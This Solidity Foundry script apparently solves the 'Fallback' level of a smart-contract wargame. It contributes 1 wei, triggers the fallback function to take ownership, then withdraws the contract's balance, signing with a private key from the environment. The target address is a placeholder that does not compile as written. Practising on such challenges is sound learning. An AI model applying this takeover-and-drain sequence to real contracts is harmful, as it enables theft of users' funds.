// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Import the contract and Forge script/console utilities
import "../src/Fallback.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";

contract FallbackSolution is Script {
    
    address fallbackInstanceAddress = 0xYourInstanceAddressHere; // Replace with the actual instance address
    Fallback public fallbackInstance = Fallback(payable(fallbackInstanceAddress));

    function run() external {
        // Start the broadcast, sending transactions from the account associated with PRIVATE_KEY
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Contribute 1 wei to pass the first condition
        fallbackInstance.contribute{value: 1 wei}();

        // Call the contract with 1 wei to trigger the fallback function
        fallbackInstanceAddress.call{value: 1 wei}("");

        // Withdraw the funds to complete the challenge
        fallbackInstance.withdraw();

        // Stop the broadcast after all transactions are sent
        vm.stopBroadcast();
    }
}